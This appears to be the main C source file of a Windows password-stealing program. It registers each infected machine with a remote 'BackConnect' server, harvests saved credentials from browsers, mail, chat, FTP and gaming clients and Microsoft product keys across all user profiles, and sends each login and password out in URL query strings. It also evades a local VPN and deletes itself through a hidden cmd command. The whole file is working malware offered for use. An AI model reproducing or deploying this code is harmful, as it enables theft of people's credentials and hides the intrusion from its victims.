
// simple Back Connect program

#include "Windows.h"
#include "stdio.h"
#include "wininet.h"
#include "Config.h"
#include "Shlobj.h"


// forwards
void ExecuteRemoval();
int RegisterSuspect(char * Installation);
void GenerateComputerID();
int VisitProxyURL(char * URL);

// imports
char *UrlEncode(char *string);
int ReadKeyData(HKEY hKey, char *subKey, char *value, char *buffer);
void lowerCase(char *pBuffer);

void StealPasswords();
void StealPasswords_AppDataRoaming(char * AppDataRoaming);
void StealPasswords_AppDataLocal(char * AppDataLocal, bool CurrentUser);

int GetMSNMessenger();
int GetGoogleTalk();
int GetTrillian(char *programFiles);
int GetPidgin(char *appData);
int GetPalTalk();
int GetSteam();
int GetNoIp();
int GetDynDNS(char *commonAppData);
int GetInternetExplorer7();
int GetFileZilla(char *appData);
int GetFlashFXP(char *commonAppData);
int GetMicrosoftKeys();
int GetIMVU();
int GetIDMAccounts();
int GetChrome(char * AppDataLocal);
int GetRapidshareDownloader();
int GetSmartFTP(char * AppDataLocal);
int GetCoreFTP();
int GetFTPCommander(char * ProgramDirectory);
int EnumProtectedStorage();
void EnumOutlookAccounts();
void initFirefoxRecovery(char * AppData);

char ComputerID[100] = "Undefined";

HANDLE ChromeThread = NULL;


/* Application Entry */

int WINAPI WinMain(__in  HINSTANCE hInstance, __in  HINSTANCE hPrevInstance, __in  LPSTR lpCmdLine, __in  int nCmdShow)
{
    char FileName[MAX_PATH];
    GetModuleFileNameA(NULL, FileName, MAX_PATH);
    lowerCase(FileName);
    GenerateComputerID();

    // on startup wait until the system is booted up
    if (lpCmdLine && lpCmdLine[0] == ErrorCodeComputerStart)
        Sleep(1000 * 10);

    // wait for an internet connection
    while(!VisitProxyURL(WhatsMyIP))
        Sleep(1000 * 5);

    // pass an installation error code (application specific)
    if (lpCmdLine && lpCmdLine[0] != '\0')
        RegisterSuspect(lpCmdLine);
    else
        RegisterSuspect(ErrorCodeStandalone);

    StealPasswords();

    // wait for other stealer threads to finish first (currently only Chrome)
    if (ChromeThread)
    {
        WaitForSingleObject(ChromeThread, INFINITE);
    }

#ifndef _DEBUG
    ExecuteRemoval();
#endif

    return ReturnCodeSuccessful;
}


void StealPasswords()
{
    // Get passwords from current user
    // Folders C:\Users\[Username]\AppData\Roaming, C:\Users\[Username]\AppData\Local
    char AppDataRoaming[MAX_PATH], AppDataLocal[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, SHGFP_TYPE_CURRENT, AppDataRoaming);
    SHGetFolderPathA(NULL, CSIDL_LOCAL_APPDATA, NULL, SHGFP_TYPE_CURRENT, AppDataLocal);
    StealPasswords_AppDataRoaming(AppDataRoaming);
    StealPasswords_AppDataLocal(AppDataLocal, 1);

    // Get passwords from all users - Vista/7 only
    // HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList\ProfileImagePath
	HKEY ProfileListKey;
	DWORD lpType=REG_SZ, lpcbData=MAX_PATH;
	if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList", 0, KEY_READ, &ProfileListKey) == ERROR_SUCCESS)
    {
        int n = 0;
        while (1)
        {
            char ProfileKeyAdd[MAX_PATH];
            DWORD SizeKey = MAX_PATH;
            if (RegEnumKeyExA(ProfileListKey, n++, ProfileKeyAdd, &SizeKey, NULL, NULL, NULL, NULL) != ERROR_SUCCESS) break;

            char TotalProfileKey[MAX_PATH] = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\ProfileList\\";
            strcat(TotalProfileKey, ProfileKeyAdd);
            HKEY ProfileKey;
            char ProfileString[MAX_PATH];
            DWORD lpType=REG_SZ, lpcbData=MAX_PATH;
            if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, TotalProfileKey, 0, KEY_READ, &ProfileKey) == ERROR_SUCCESS &&
    		    RegQueryValueExA(ProfileKey, "ProfileImagePath", 0, &lpType, (unsigned char *)ProfileString, &lpcbData) == ERROR_SUCCESS)
            {
                // AppData directory
                char AppDataRoaming[MAX_PATH];
                strcpy(AppDataRoaming, ProfileString);
                strcat(AppDataRoaming, "\\AppData\\Roaming");
                StealPasswords_AppDataRoaming(AppDataRoaming);

                // LocalAppData directory
                char AppDataLocal[MAX_PATH];
                strcpy(AppDataLocal, ProfileString);
                strcat(AppDataLocal, "\\AppData\\Local");
                StealPasswords_AppDataLocal(AppDataLocal, 0);
            }
    		RegCloseKey(ProfileKey);
        }

        RegCloseKey(ProfileListKey);
	}

    // Folder C:\Program Files
    char ProgramFiles[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_PROGRAM_FILES, NULL, SHGFP_TYPE_CURRENT, ProgramFiles);
    GetTrillian(ProgramFiles);
    GetFTPCommander(ProgramFiles);

    // Folder C:\ProgramData
    char CommonAppData[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_COMMON_APPDATA, NULL, SHGFP_TYPE_CURRENT, CommonAppData);
    GetDynDNS(CommonAppData);
    GetFlashFXP(CommonAppData);

    // all other are in custom locations
    GetMSNMessenger();
    GetGoogleTalk();
    GetPalTalk();
    GetSteam();
    GetNoIp();
    GetInternetExplorer7();
    GetMicrosoftKeys();
    EnumOutlookAccounts();
//    EnumProtectedStorage();
    GetIMVU();
    GetIDMAccounts();
    GetRapidshareDownloader();
    GetCoreFTP();
}

void StealPasswords_AppDataRoaming(char * AppDataRoaming)
{
    GetPidgin(AppDataRoaming);
    GetFileZilla(AppDataRoaming);
    initFirefoxRecovery(AppDataRoaming);
    GetSmartFTP(AppDataRoaming);
}

void StealPasswords_AppDataLocal(char * AppDataLocal, bool CurrentUser)
{
    // applications that need to run in the current user context to decrypt the passwords
    if (CurrentUser)
    {
        GetChrome(AppDataLocal);
    }
}


/* simple self deletion (only Vista/7) */

void ExecuteRemoval()
{
    wchar_t FileName[MAX_PATH];
    if (!GetModuleFileName(NULL, FileName, MAX_PATH))
        return;

    wchar_t Param[MAX_PATH] = L"/c timeout 3 && del \"";        // timeout exists only on Vista
    wcscat(Param, FileName);
    wcscat(Param, L"\"");

    ShellExecute(NULL, NULL, L"cmd", Param, NULL, SW_HIDE);
}


/* simple notification */
#ifdef Notification

void Notify(char * InstallationStatus)
{
	char URL[1000] = NotificationServerA "?";

	// [OS]
	char OS[100];
	OSVERSIONINFO Version;
	Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&Version);
	sprintf(OS, "OS=Windows %u.%u", Version.dwMajorVersion, Version.dwMinorVersion);
	strcat(URL, OS);

	// [COMPUTER]
	char Computer[100];
	DWORD Size = 100;
	GetComputerNameA(Computer, &Size);
	strcat(URL, "&Computer=");
	strcat(URL, Computer);

	// [USER]
	char User[100];
	Size = 100;
	GetUserNameA(User, &Size);
	strcat(URL, "&User=");
	strcat(URL, User);

    // [INSTALLATION]
	strcat(URL, "&Installation=");
	strcat(URL, InstallationStatus);

	// notification
    VisitProxyURL(URL);

	return;
}

#endif


// registers the suspect in the BackConnect system

int RegisterSuspect(char * Installation)
{
	char urlPath[1024];

	strcpy(urlPath, BackConnectURLA);
	strcat(urlPath, "?action=register&i=");

    // Computer ID
	strcat(urlPath, ComputerID);

    // OS
	strcat(urlPath, "&o=");
	char OS[100];
	OSVERSIONINFO Version;
	Version.dwOSVersionInfoSize = sizeof(OSVERSIONINFO);
	GetVersionEx(&Version);
	sprintf(OS, "Windows %u.%u", Version.dwMajorVersion, Version.dwMinorVersion);
	strcat(urlPath, UrlEncode(OS));

    // Computer Name
	strcat(urlPath, "&c=");
	char Computer[100];
	DWORD Size = 100;
	GetComputerNameA(Computer, &Size);
	strcat(urlPath, UrlEncode(Computer));

    // User Name
	strcat(urlPath, "&u=");
	char User[100];
	Size = 100;
	GetUserNameA(User, &Size);
	strcat(urlPath, UrlEncode(User));

    // Installation
	strcat(urlPath, "&f=");
	strcat(urlPath, Installation);

    // report it
    VisitProxyURL(urlPath);

	return 1;
}


int SendPassword(char *application, char *url, char *login, char *pass)
{
	char urlPath[1024], urlTmp[500];
	unsigned long dwSize = 50;

	strcpy(urlPath, BackConnectURLA);
	strcat(urlPath, "?action=add&a=");
	strcat(urlPath, application);
	strcat(urlPath, "&u=");
	if (strlen(url)>0)
    {
        if (strlen(url) >= 150) url[150] = '\0';
		strcpy(urlTmp, url);
		strncat(urlPath, UrlEncode(urlTmp), 1024 - strlen(urlPath));
	}
	strcat(urlPath, "&l=");
	if (strlen(login)>0)
    {
        if (strlen(login) >= 50) login[50] = '\0';
		strcpy(urlTmp, login);
		strncat(urlPath, UrlEncode(urlTmp), 1024 - strlen(urlPath));
	}
	strcat(urlPath, "&p=");
	if (strlen(pass)>0 && strcmp(pass, "(null)") != 0)
    {
        if (strlen(pass) >= 50) pass[50] = '\0';
		strcpy(urlTmp, pass);
		strncat(urlPath, UrlEncode(urlTmp), 1024 - strlen(urlPath));
	}
    strcat(urlPath, "&c=");
	strncat(urlPath, ComputerID, 1024 - strlen(urlPath));

    VisitProxyURL(urlPath);

	return 1;
}


void GenerateComputerID()
{
    // get the Machine GUID, example 5c5426b2-2e0b-4714-b5b7-2488c69f1446
    char MachineGuid[MAX_PATH];

    if (!ReadKeyData(HKEY_LOCAL_MACHINE, "Software\\Microsoft\\Cryptography", "MachineGuid", MachineGuid))
        return;

    strncpy(ComputerID, MachineGuid, 13);   // 5c5426b2-2e0b
    ComputerID[13] = '\0';
    UrlEncode(ComputerID);
}


// accessing an URL through proxy configuration
// Note: This gets the real IP by using INTERNET_OPEN_TYPE_DIRECT and bypassing a local VPN

inline int VisitProxyURL(char * URL)
{
    // first try using the direct connection
    HINTERNET Internet, Website;
	Internet = InternetOpenA(HTTPAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!Internet)
        return 0;
    Website = InternetOpenUrlA(Internet, URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetCloseHandle(Internet);
    if (Website)
    {
	    InternetCloseHandle(Website);
        return 1;
    }

    // if not working try through proxy configuration
    HINTERNET Internet2;
    Internet2 = InternetOpenA(HTTPAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!Internet2)
        return 0;
    Website = InternetOpenUrlA(Internet2, URL, NULL, 0, INTERNET_FLAG_RELOAD, 0);
	InternetCloseHandle(Internet2);
    if (Website)
    {
	    InternetCloseHandle(Website);
        return 1;
    }

    return 0;
}
